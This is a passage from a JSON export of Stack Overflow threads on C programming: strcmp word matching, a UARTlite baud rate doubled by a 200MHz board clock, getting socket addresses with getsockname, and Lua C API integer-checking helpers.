nextword[arr])\n</code></pre>\n\n<p>Also, both strings needs to be zero-terminated or you would have <em>undefined behavior</em>. If the strings are not zero-terminated you need to use <code>strncmp</code> instead (or possibly <code>memcmp</code>).</p>\n"}, {"tags": [], "owner": {"reputation": 3723, "user_id": 1169091, "user_type": "registered", "accept_rate": 9, "profile_image": "https://i.stack.imgur.com/5vE4L.jpg?s=128&g=1", "display_name": "nicomp", "link": "https://stackoverflow.com/users/1169091/nicomp"}, "is_accepted": false, "score": 0, "last_activity_date": 1447261400, "creation_date": 1447261400, "answer_id": 33655802, "question_id": 33653552, "link": "https://stackoverflow.com/questions/33653552/searching-for-equal-strings-using-strcmp/33655802#33655802", "title": "Searching for equal strings using strcmp", "body": "<p>Without seeing the words being compared I have one guess:\n1. There are leading or trailing spaces you don't know about. Try printing out the strings with delimiters in the print statement so you can easily see if there are any spaces that need to be trimmed. </p>\n"}], "owner": {"reputation": 375, "user_id": 4551823, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/851af7dce4f502a930cb9608b3cd02ef?s=128&d=identicon&r=PG&f=1", "display_name": "Finlandia_C", "link": "https://stackoverflow.com/users/4551823/finlandia-c"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 616, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1447261400, "creation_date": 1447254776, "last_edit_date": 1447255418, "question_id": 33653552, "link": "https://stackoverflow.com/questions/33653552/searching-for-equal-strings-using-strcmp", "title": "Searching for equal strings using strcmp", "body": "<p>I have a 2D array containing real words of the same length (dictionary). I also have a 2D array of strings (mostly rubbish, with some real words in there). I'm trying to find the real words in the second array by using strcmp. Once a real word is found (strcmp = 0), I want to copy that word into a new 2D string array called <code>actual_words</code> then print it. </p>\n\n<p>However mine seems to just print <code>Words which are viable:</code> and no actual words ... no errors though.</p>\n\n<p>All strings are null terminated.</p>\n\n<pre><code>void check_dictionary (char equal_length_dictionary[MAX_WORDS][MAX_WORD_LENGTH], char nextword[MAX_WORDS][MAX_WORD_LENGTH])\n\n{\nint arr, dict;\nchar actual_words[MAX_WORDS][MAX_WORD_LENGTH];\n\nprintf(\"\\nWords which are viable: \\n\");\n\nfor (dict = 0; equal_length_dictionary[dict][0] != '\\0'; dict++)\n{\n//look through each word in dictionary\n    for (arr = 0; nextword[arr][0] != '\\0'; arr++) \n    //look through each word in the array\n        {\n                if ((strcmp(equal_length_dictionary[arr], nextword[arr])) == 0) \n                //test for differences between dictionary and word\n                    {\n                        strcpy(actual_words[arr], nextword[arr]); \n                        //if no differences, copy words\n                        printf(\"%s \", actual_words[arr]);\n                    }\n        }\n}     \nprintf(\"\\n\");\n}\n</code></pre>\n"}, {"tags": ["c", "xilinx", "uart", "baud-rate", "microblaze"], "comments": [{"owner": {"reputation": 13176, "user_id": 3719459, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/sBD6F.jpg?s=128&g=1", "display_name": "Paebbels", "link": "https://stackoverflow.com/users/3719459/paebbels"}, "edited": false, "score": 0, "creation_date": 1447259586, "post_id": 33653445, "comment_id": 55083727, "body": "Which baudrate is configured for the UARTlite module?"}, {"owner": {"reputation": 215, "user_id": 5466496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c79e9540ca7d65f26fc8f36e091e211?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay Madapura", "link": "https://stackoverflow.com/users/5466496/vinay-madapura"}, "reply_to_user": {"reputation": 13176, "user_id": 3719459, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/sBD6F.jpg?s=128&g=1", "display_name": "Paebbels", "link": "https://stackoverflow.com/users/3719459/paebbels"}, "edited": false, "score": 0, "creation_date": 1447261929, "post_id": 33653445, "comment_id": 55085189, "body": "@Paebbels  I have chosen 19200 bps."}, {"owner": {"reputation": 13176, "user_id": 3719459, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/sBD6F.jpg?s=128&g=1", "display_name": "Paebbels", "link": "https://stackoverflow.com/users/3719459/paebbels"}, "edited": false, "score": 1, "creation_date": 1447263762, "post_id": 33653445, "comment_id": 55086301, "body": "So if both sides (hardware and software) work at <code>19.2 kBd</code> and sampling at <code>38.4 kBd</code> at software side shows the right behavior, I would assume that your hardware module runs at doubled frequency. For what frequency was UARTlite generated?"}, {"owner": {"reputation": 215, "user_id": 5466496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c79e9540ca7d65f26fc8f36e091e211?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay Madapura", "link": "https://stackoverflow.com/users/5466496/vinay-madapura"}, "reply_to_user": {"reputation": 13176, "user_id": 3719459, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/sBD6F.jpg?s=128&g=1", "display_name": "Paebbels", "link": "https://stackoverflow.com/users/3719459/paebbels"}, "edited": false, "score": 0, "creation_date": 1447273392, "post_id": 33653445, "comment_id": 55091891, "body": "The hardware uses 100MHz axi clock. It is generated by a Clocking Wizard IP core."}], "answers": [{"tags": [], "owner": {"reputation": 215, "user_id": 5466496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c79e9540ca7d65f26fc8f36e091e211?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay Madapura", "link": "https://stackoverflow.com/users/5466496/vinay-madapura"}, "is_accepted": true, "score": 0, "last_activity_date": 1447409793, "creation_date": 1447409793, "answer_id": 33690375, "question_id": 33653445, "link": "https://stackoverflow.com/questions/33653445/baudrate-mismatch-between-axi-uartlite-and-teraterm/33690375#33690375", "title": "baudrate mismatch between AXI-Uartlite and Teraterm", "body": "<p>found the reason for the strange behaviour.\nIt was a mistake from my side during design phase. According to my previous design, the Clocking wizard expects 100MHz as input and is designed to produce 100MHz at the output (no division is done). My UARTLite core also expects a 100MHz clock and applies the relevant divider values to generate a baudrate of 19200. But the board is supplying 200MHz. The clk_wizard assumes it is 100MHz and passes the clock without any division, and the chain continues till UARTLite. Here the UARTLite divides the 200MHz clk with the number it generated for a 100MHz clk. And thus I am transferring at double the speed.</p>\n\n<p>Anyways, thank you for the time.</p>\n"}], "owner": {"reputation": 215, "user_id": 5466496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c79e9540ca7d65f26fc8f36e091e211?s=128&d=identicon&r=PG&f=1", "display_name": "Vinay Madapura", "link": "https://stackoverflow.com/users/5466496/vinay-madapura"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 997, "favorite_count": 0, "accepted_answer_id": 33690375, "answer_count": 1, "score": 0, "last_activity_date": 1447409793, "creation_date": 1447254427, "last_edit_date": 1592644375, "question_id": 33653445, "link": "https://stackoverflow.com/questions/33653445/baudrate-mismatch-between-axi-uartlite-and-teraterm", "title": "baudrate mismatch between AXI-Uartlite and Teraterm", "body": "<p>I have built a simple Microblaze system on a Kintex 7 on Avnet's MMP2 board. I am using Uartlite (v2.0) IP in this system and communicate to a PC using Teraterm (v4.85). The baudrate for the Uartlite component must be fixed at a particular value at the design stage. I have chosen 19200 bps for my design. I have written a very simple application that is sending 6 consecutive <code>&quot;At&quot;</code>s to the PC through Teraterm, then get an ascii character from the Teraterm console and print the same. The problem is that, for every <code>&quot;At&quot;</code> the Teraterm displays only one <code>'\u00c7'</code> on the console. The transmission parameters are as follows:</p>\n<blockquote>\n<p>19200 bps; 8 data bits; 1 stop bit; No parity; No Flow-control</p>\n</blockquote>\n<p>However, after a lot of head scratching and trial and errors, I discovered that if I change the baudrate in Teraterm to 38400 bps, I get the desired behaviour, i.e., I get the <code>&quot;At&quot;</code>s on the console, get a char from console and print it back.</p>\n<p>As far as I know the code (which is really very simple), I have not changed the baudrate. But somehow, I am sending data at a rate faster than the specified rate. The clock used is 100MHz. Since the baudrate MUST be specified in the design phase, how is it even possible to attain a higher baud rate? What have I done wrong?</p>\n<p>The code goes like this:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &quot;platform.h&quot;\n#include &quot;xgpio_l.h&quot;\n#include &quot;xintc_l.h&quot;\n#include &quot;xparameters.h&quot;\n#include &quot;xuartlite_l.h&quot;\n\n\n#define MAX_UART_BUFFER_LENGTH 16\n\nu8 uart_rx_data = 0;\n\nint main()\n{\n    init_platform();\n    //Init GPIOs\n    //dip switch port as input\n    XGpio_WriteReg(XPAR_AXI_GPIO_0_BASEADDR, XGPIO_TRI_OFFSET, 0xFFFFFFFF);\n\n    char count_data = 0x0F;\n    while(1)\n    {\n        unsigned int dip_gpio_data = XGpio_ReadReg(XPAR_AXI_GPIO_0_BASEADDR, XGPIO_DATA_OFFSET) &amp; 0x000000FF;\n        if(dip_gpio_data == 0)\n        {\n            u8 send_data[MAX_UART_BUFFER_LENGTH] = &quot;AtAtAtAtAtAt&quot;;\n            u8 i = 0 ;\n            for (i = 0; i &lt; MAX_UART_BUFFER_LENGTH; i++)\n            {\n                if(send_data[i] != '\\0')\n                    XUartLite_SendByte(XPAR_AXI_UARTLITE_0_BASEADDR, send_data[i]);\n                else\n                    break;\n            }\n            //Rx something from Teraterm\n            uart_rx_data = XUartLite_RecvByte(XPAR_AXI_UARTLITE_0_BASEADDR);\n            //Send same thing back\n            XUartLite_SendByte(XPAR_AXI_UARTLITE_0_BASEADDR, uart_rx_data);\n            XUartLite_SendByte(XPAR_AXI_UARTLITE_0_BASEADDR, '\\n');\n            XUartLite_SendByte(XPAR_AXI_UARTLITE_0_BASEADDR, '\\r');\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n<p><strong>EDIT:</strong></p>\n<p>Today, I tried to reduce the baudrate to 9600 at the UARTlite IP core, regenerated bitstream and ran again. The same result. If I set baudrate of Teraterm to 9600, it doesn't work. Teraterm gives an option of 14400 baudrate. I used this. I get 12 chars, but gibberish. If I exactly double it to 19200, it works perfectly. I will try with other baud rates as well and update. Please help.!! This is still the basic part of my design. Image below for reference:</p>\n<p><a href=\"https://i.stack.imgur.com/AIVMZ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/AIVMZ.png\" alt=\"enter image description here\" /></a></p>\n<p><strong>EDIT2:</strong></p>\n<p>I tried the following:</p>\n<ol>\n<li><p>Uninstalled Teraterm and re-installed</p>\n</li>\n<li><p>Installed Realterm</p>\n</li>\n<li><p>Installed hyperterminal</p>\n</li>\n</ol>\n<p>Tried with all 3. No change in the behaviour. :(</p>\n"}, {"tags": ["c", "linux", "sockets"], "comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 3, "creation_date": 1447252860, "post_id": 33652829, "comment_id": 55079044, "body": "<a href=\"http://linux.die.net/man/2/getsockname\" rel=\"nofollow noreferrer\">linux.die.net/man/2/getsockname</a>"}, {"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1447257756, "post_id": 33652829, "comment_id": 55082441, "body": "Sounds like X-Y.  You are trying to get your IP and you think that using a socket is the way to do it.  It isn&#39;t."}, {"owner": {"reputation": 12213, "user_id": 671703, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/96ac349a9c65277e304401ea92a62ff4?s=128&d=identicon&r=PG", "display_name": "pat", "link": "https://stackoverflow.com/users/671703/pat"}, "edited": false, "score": 0, "creation_date": 1447259232, "post_id": 33652829, "comment_id": 55083481, "body": "Is your ultimate goal to run a TCP server, or just to get your IP address?  Note that your machine will typically have at least two IP addresses (one loopback and one Ethernet), and possibly more if you are multi-homed."}], "answers": [{"comments": [{"owner": {"reputation": 782, "user_id": 5540159, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-MJ9IhOqalP0/AAAAAAAAAAI/AAAAAAAAAD0/egN32ePCkoE/photo.jpg?sz=128", "display_name": "stevGates", "link": "https://stackoverflow.com/users/5540159/stevgates"}, "edited": false, "score": 0, "creation_date": 1447258465, "post_id": 33654459, "comment_id": 55082921, "body": "give me the code source please !"}, {"owner": {"reputation": 12213, "user_id": 671703, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/96ac349a9c65277e304401ea92a62ff4?s=128&d=identicon&r=PG", "display_name": "pat", "link": "https://stackoverflow.com/users/671703/pat"}, "reply_to_user": {"reputation": 782, "user_id": 5540159, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-MJ9IhOqalP0/AAAAAAAAAAI/AAAAAAAAAD0/egN32ePCkoE/photo.jpg?sz=128", "display_name": "stevGates", "link": "https://stackoverflow.com/users/5540159/stevgates"}, "edited": false, "score": 0, "creation_date": 1447258970, "post_id": 33654459, "comment_id": 55083287, "body": "Source for what?  The whole listen and accept, or just the getsockname?  Just Google for &quot;&lt;function&gt; example&quot; with the specific function you are interested in."}], "tags": [], "owner": {"reputation": 12213, "user_id": 671703, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/96ac349a9c65277e304401ea92a62ff4?s=128&d=identicon&r=PG", "display_name": "pat", "link": "https://stackoverflow.com/users/671703/pat"}, "is_accepted": true, "score": 2, "last_activity_date": 1447265245, "last_edit_date": 1447265245, "creation_date": 1447257213, "answer_id": 33654459, "question_id": 33652829, "link": "https://stackoverflow.com/questions/33652829/how-get-address-ip-of-socket-in-c/33654459#33654459", "title": "how get address ip of socket in C", "body": "<p>The socket has been bound to <code>INADDR_ANY</code> port <code>2018</code>.  It does not have an address more specific than that.  The <code>INADDR_ANY</code> indicates that the socket will <a href=\"http://man7.org/linux/man-pages/man2/accept.2.html\" rel=\"nofollow\"><code>accept</code></a> connections on any of its interfaces.  It is not connected, so it has no remote address.</p>\n\n<p>Since the socket is apparently intended to be used in a server, you will need to call <a href=\"http://man7.org/linux/man-pages/man2/listen.2.html\" rel=\"nofollow\"><code>listen</code></a> and then <a href=\"http://man7.org/linux/man-pages/man2/accept.2.html\" rel=\"nofollow\"><code>accept</code></a> to get a new connected socket (assuming something actually <a href=\"http://man7.org/linux/man-pages/man2/connect.2.html\" rel=\"nofollow\"><code>connect</code>s</a> to it).  The connected socket will have a more specific address bound to both its local and remote ends.  You can get the local address by calling <a href=\"http://man7.org/linux/man-pages/man2/getsockname.2.html\" rel=\"nofollow\"><code>getsockname</code></a> and the remote address by calling <a href=\"http://man7.org/linux/man-pages/man2/getpeername.2.html\" rel=\"nofollow\"><code>getpeername</code></a>.</p>\n\n<p>Here is what a TCP server might look like (all error checking is left as an exercise for the reader):</p>\n\n<pre><code>struct sockaddr_in sin;\n\n/* create socket */\nint sd = socket(AF_INET, SOCK_STREAM, 0);\n\n/* bind socket to port 2018, any interface */\nsin.sin_family = AF_INET;\nsin.sin_addr.s_addr = htonl(INADDR_ANY);\nsin.sin_port = htons(2018);\nbind(sd, (struct sockaddr*)&amp;sin, sizeof(sin));\n\n/* start listening for connections */\nlisten(sd, 5);\n\n/* accept connections forever */\nwhile (1) {\n    struct sockaddr_in remote_sin;\n    socklen_t remote_sinlen = sizeof(remote_sin);\n    struct sockaddr_in local_sin;\n    socklen_t local_sinlen = sizeof(local_sin);\n\n    /* wait for a connection */\n    int nsd = accept(sd, (struct sockaddr*)&amp;remote_sin, &amp;remote_sinlen);\n\n    /* get the local address of the connected socket */\n    getsockname(nsd, (struct sockaddr*)&amp;local_sin, &amp;local_sinlen);\n\n    /* local address is in local_sin.  local_sinlen should still be sizeof(local_sin).\n     * remote address is in remote_sin.  remote_sinlen should still be sizeof(remote_sin).\n     */\n\n    /* service connection, or fork a child to do it, or whatever... */\n\n    /* close the connection */\n    close(nsd);\n}\n</code></pre>\n"}], "owner": {"reputation": 782, "user_id": 5540159, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-MJ9IhOqalP0/AAAAAAAAAAI/AAAAAAAAAD0/egN32ePCkoE/photo.jpg?sz=128", "display_name": "stevGates", "link": "https://stackoverflow.com/users/5540159/stevgates"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4150, "favorite_count": 0, "closed_date": 1447270172, "accepted_answer_id": 33654459, "answer_count": 1, "score": 1, "last_activity_date": 1447265245, "creation_date": 1447252617, "last_edit_date": 1447256585, "question_id": 33652829, "link": "https://stackoverflow.com/questions/33652829/how-get-address-ip-of-socket-in-c", "closed_reason": "Needs details or clarity", "title": "how get address ip of socket in C", "body": "<p>I want to get IP address through the socket.  My code:</p>\n\n<pre><code>      .\n      .\n      .\nint socket_server = socket(AF_INET, SOCK_STREAM, 0);\n\nadresse_serveur.sin_family      = AF_INET; // le domain\nadresse_serveur.sin_addr.s_addr = htonl(INADDR_ANY);\nadresse_serveur.sin_port        = htons(2018);\n\nint taille_de_structure = sizeof(adresse_serveur);\nbind(socket_server, (struct sockaddr*)&amp;adresse_serveur, taille_de_structure);\n      .\n      .\n      .\n</code></pre>\n"}, {"tags": ["c", "lua", "lua-api"], "comments": [{"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1447254556, "post_id": 33652665, "comment_id": 55080210, "body": "I don&#39;t understand the question. You can certainly write a &quot;helper&quot; function to reduce the duplication among those sets of lines for getting &quot;integer&quot; values but that&#39;s not exactly what it would look like."}, {"owner": {"reputation": 63, "user_id": 5431949, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/5cd8cfde44ecc13f1ef0400682d9cc06?s=128&d=identicon&r=PG&f=1", "display_name": "Chozie", "link": "https://stackoverflow.com/users/5431949/chozie"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1447257980, "post_id": 33652665, "comment_id": 55082605, "body": "Topic edited to better understand, what I intend to do is a message to say that lua_tointeger only accepts numbers, for example if I use a string or boolean value it shows the alert message."}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1447258261, "post_id": 33652665, "comment_id": 55082784, "body": "Yes, you want to be able to easily handle a handful of &quot;integer&quot; values and alert when they aren&#39;t valid. You can easily refactor your existing code into a helper function which lets you do that instead of duplicating the entire set of lines every time. Have you tried? I&#39;m not sure what you think <code>lua_tointeger() != lua_isinteger()</code> is going to do for you (since they return a <code>lua_Integer</code> and a boolean <code>int</code> respectively) but checking that you got a valid integer is certainly possible."}, {"owner": {"reputation": 63, "user_id": 5431949, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/5cd8cfde44ecc13f1ef0400682d9cc06?s=128&d=identicon&r=PG&f=1", "display_name": "Chozie", "link": "https://stackoverflow.com/users/5431949/chozie"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1447258709, "post_id": 33652665, "comment_id": 55083103, "body": "How can I do? by checking only occurs in <code>lua_getfield (L, -3, &quot;time&quot;);</code> the other two can&#39;t do reading the message. Another question is how can I capture the lua_getfield name for example: <code>The entry value_pos_x is invalid;</code>"}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1447259408, "post_id": 33652665, "comment_id": 55083615, "body": "A macro can replace those lines as-is (and include the final lines and error message too). A function could replace everything but the assignment (and that could be done with the return value of the function or similar)."}, {"owner": {"reputation": 63, "user_id": 5431949, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/5cd8cfde44ecc13f1ef0400682d9cc06?s=128&d=identicon&r=PG&f=1", "display_name": "Chozie", "link": "https://stackoverflow.com/users/5431949/chozie"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1447259910, "post_id": 33652665, "comment_id": 55083955, "body": "I did not understand, could you give an example?"}], "answers": [{"comments": [{"owner": {"reputation": 63, "user_id": 5431949, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/5cd8cfde44ecc13f1ef0400682d9cc06?s=128&d=identicon&r=PG&f=1", "display_name": "Chozie", "link": "https://stackoverflow.com/users/5431949/chozie"}, "edited": false, "score": 0, "creation_date": 1447261773, "post_id": 33655587, "comment_id": 55085102, "body": "Etan you helped me understand how to proceed. Now one last question if the function cr-&gt; is different from lua_getfield as I can do the checking. E.g: <code>lua_getfield(L, -1, &quot;value_time_expire&quot;); cr-&gt;expire = lua_tointeger(L, -1);</code>"}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "reply_to_user": {"reputation": 63, "user_id": 5431949, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/5cd8cfde44ecc13f1ef0400682d9cc06?s=128&d=identicon&r=PG&f=1", "display_name": "Chozie", "link": "https://stackoverflow.com/users/5431949/chozie"}, "edited": false, "score": 0, "creation_date": 1447262567, "post_id": 33655587, "comment_id": 55085565, "body": "The macro version requires that they are the same. The function version does not. The function version leaves assignment to your <code>cr</code> structure separate from the lua-side key name. You could absolutely do <code>cr-&gt;expire = get_integer_warn(L, -3, &quot;value_time_expire&quot;)</code> or whatever."}, {"owner": {"reputation": 63, "user_id": 5431949, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/5cd8cfde44ecc13f1ef0400682d9cc06?s=128&d=identicon&r=PG&f=1", "display_name": "Chozie", "link": "https://stackoverflow.com/users/5431949/chozie"}, "edited": false, "score": 0, "creation_date": 1447262959, "post_id": 33655587, "comment_id": 55085800, "body": "I Understand, thank you Etan for explaining, problem solved."}], "tags": [], "owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "is_accepted": false, "score": 2, "last_activity_date": 1447289238, "last_edit_date": 1447289238, "creation_date": 1447260685, "answer_id": 33655587, "question_id": 33652665, "link": "https://stackoverflow.com/questions/33652665/alert-messages-for-lua-functions/33655587#33655587", "title": "Alert messages for lua functions", "body": "<p>A macro something like this (untested and written in SO editing box):</p>\n\n<pre><code>#define GET_INTEGER_WARN(ind, fld) do { \\\n    lua_getfield(L, ind, #fld); \\\n    cr-&gt;fld = lua_tointeger(L, -1); \\\n    \\\n    if (!lua_isinteger(L, -1)) \\\n        printf(#fld\" allows only numbers;\"); \\\n    } while (0)\n</code></pre>\n\n<p>Would let you do something like this:</p>\n\n<pre><code>lua_getglobal(L, \"lgd\");\n\nGET_INTEGER_WARN(-1, value_pos_x);\n\nGET_INTEGER_WARN(-2, value_pos_y);\n\nGET_INTEGER_WARN(-3, time);\n</code></pre>\n\n<p>A function like this (same caveats as before):</p>\n\n<pre><code>lua_Integer\nget_integer_warn(lua_State *L, int ind, char *fld)\n{\n    lua_getfield(L, ind, fld);\n\n    if (!lua_isinteger(L, -1))\n        printf(\"%s allows only numbers\", fld);\n\n    return lua_tointeger(L, -1);\n}\n</code></pre>\n\n<p>Would let you do something like this:</p>\n\n<pre><code>cr-&gt;value_pos_x = get_integer_warn(L, -1, \"value_pos_x\")\ncr-&gt;value_pos_y = get_integer_warn(L, -2, \"value_pos_y\")\ncr-&gt;time = get_integer_warn(L, -3, \"time\")\n</code></pre>\n"}], "owner": {"reputation": 63, "user_id": 5431949, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/5cd8cfde44ecc13f1ef0400682d9cc06?s=128&d=identicon&r=PG&f=1", "display_name": "Chozie", "link": "https://stackoverflow.com/users/5431949/chozie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 813, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1447289238, "creation_date": 1447252144, "last_edit_date": 1447257821, "question_id": 33652665, "link": "https://stackoverflow.com/questions/33652665/alert-messages-for-lua-functions", "title": "Alert messages for lua functions", "body": "<p>I have the following code:</p>\n\n<pre><code>lua_getglobal(L, \"lgd\");\n\nlua_getfield(L, -1, \"value_pos_x\");\ncr-&gt;value_pos_x = lua_tointeger(L, -1);\n\nif (!lua_isinteger(L, -1))\n    printf(\"value_pos_x allows only numbers;\");\n\nlua_getfield(L, -2, \"value_pos_y\");\ncr-&gt;value_pos_y = lua_tointeger(L, -1);\n\nif (!lua_isinteger(L, -1))\n    printf(\"value_pos_y allows only numbers;\");\n\nlua_getfield(L, -3, \"time\");\n    cr-&gt;time = lua_tointeger(L, -1);\n\nif (!lua_isinteger(L, -1))\n    printf(\"time allows only numbers;\");\n</code></pre>\n\n<p>The code works perfectly. The question I wanted to know if it is possible to keep only one message and that would apply to each function for example:</p>\n\n<pre><code>lua_getglobal(L, \"lgd\");\n\nlua_getfield(L, -1, \"value_pos_x\");\ncr-&gt;value_pos_x = lua_tointeger(L, -1);\n\nlua_getfield(L, -2, \"value_pos_y\");\ncr-&gt;value_pos_y = lua_tointeger(L, -1);\n\nlua_getfield(L, -3, \"time\");\ncr-&gt;time = lua_tointeger(L, -1);\n\nif (lua_tointeger(L, -1) != lua_isinteger(L, -1))\n        printf(\"The entry %s is invalid;\", capture_lua_getfield_name);\n</code></pre>\n"}, {"tags": ["c", "function"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1447251841, "post_id": 33652563, "comment_id": 55078406, "body": "in that case, why do you have the other function?"}, {"owner": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1447251888, "post_id": 33652563, "comment_id": 55078442, "body": "@SouravGhosh I just want to learn if there is another way if possible!"}, {"owner": {"reputation": 32882, "user_id": 1870760, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/NAAkp.png?s=128&g=1", "display_name": "Hatted Rooster", "link": "https://stackoverflow.com/users/1870760/hatted-rooster"}, "edited": false, "score": 0, "creation_date": 1447251944, "post_id": 33652563, "comment_id": 55078481, "body": "If you want to have the user input the numbers in the <code>main</code> function then why do you have <code>fun_1</code> in the first place?"}, {"owner": {"reputation": 4186, "user_id": 2773311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/wIGqo.png?s=128&g=1", "display_name": "Arc676", "link": "https://stackoverflow.com/users/2773311/arc676"}, "edited": false, "score": 0, "creation_date": 1447251947, "post_id": 33652563, "comment_id": 55078483, "body": "The whole point of functions returning <code>void</code> is that <i>they return no value</i>. They just, well, do stuff. If you want to get <i>information</i> out of the function, return something, like <code>int</code>."}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 3, "last_activity_date": 1447253408, "last_edit_date": 1447253408, "creation_date": 1447251939, "answer_id": 33652603, "question_id": 33652563, "link": "https://stackoverflow.com/questions/33652563/return-a-value-to-main-function-with-pointers/33652603#33652603", "title": "Return a value to main function with pointers", "body": "<p>There is another way to make use of 